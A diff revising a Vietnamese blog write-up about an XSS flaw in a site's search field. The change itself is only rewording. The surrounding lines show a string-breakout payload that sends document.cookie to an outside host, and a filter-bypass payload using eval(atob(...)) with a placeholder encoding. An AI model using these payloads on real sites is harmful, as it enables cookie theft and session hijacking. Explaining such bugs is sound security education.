@@ -52,7 +52,7 @@ iphone 7" }; window.location="http://google.com/" + document.cookie; var a = { "
 
 ![alt text](https://s3-ap-southeast-1.amazonaws.com/kipalog.com/o7l9sidows_c4.png)
 
-Cái lề gì thốn, coder đã cẩn thận bỏ dấu gạch chéo // và phần sau của search key đi, cũng như lọc một số từ đặc biệt trong chuỗi, như vậy là không thể tương tác gì url bên ngoài được? Không, phải nghĩ cách khác. Cuối cùng thì mình đã tìm ra cách hoàn hảo nhất là đây:
+Như các bạn thấy, coder đã cẩn thận bỏ dấu gạch chéo // và phần sau của search key đi, cũng như lọc một số từ đặc biệt trong chuỗi, như vậy là không thể tương tác gì url bên ngoài được? Không, phải nghĩ cách khác. Cuối cùng thì mình đã tìm ra cách hoàn hảo nhất là đây:
 
 ```javascript
 iphone 7" }; eval(atob("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")); var a = { "a":"
